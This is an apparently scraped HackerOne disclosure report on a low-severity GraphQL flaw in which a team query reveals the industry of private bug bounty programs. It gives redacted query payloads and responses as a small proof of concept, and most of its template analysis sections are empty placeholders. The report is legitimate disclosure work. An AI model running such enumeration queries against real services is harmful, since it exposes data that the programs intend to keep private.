# Team object in GraphQL disclosed of private programs via the industry

## Metadata
- **Source:** HackerOne
- **Report:** 707406 | https://hackerone.com/reports/707406
- **Submitted:** 2019-10-04
- **Reporter:** haxta4ok00
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** low
- **Vuln:** graphql
- **CVEs:** None
- **Category:** web-api

## Summary
**Summary:**
Disclosure of private programs across the industry


If the program is private, it will show industriy


### Steps To Reproduce
{"query": "query {team(handle:\\"█████████\\"){_id,industry}}"}

`{"data":{"team":{"_id":"█████████","industry":"Computer Hardware \u0026 Peripherals"}}}`

{"query": "query {team(handle:\\"█████████\\"){_id,industry}}"}

`{"data":{"team":{"_id":"████████","in

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Summary:**
Disclosure of private programs across the industry


If the program is private, it will show industriy


### Steps To Reproduce
{"query": "query {team(handle:\\"█████████\\"){_id,industry}}"}

`{"data":{"team":{"_id":"█████████","industry":"Computer Hardware \u0026 Peripherals"}}}`

{"query": "query {team(handle:\\"█████████\\"){_id,industry}}"}

`{"data":{"team":{"_id":"████████","industry":"Computer Software"}}}`

{"query": "query {team(handle:\\"███\\"){_id,industry}}"}

`{"data":{"team":{"_id":"████","industry":null}}}`

## Impact

Disclosure of private programs

</details>

---
*Analysed by Claude on 2026-05-24*
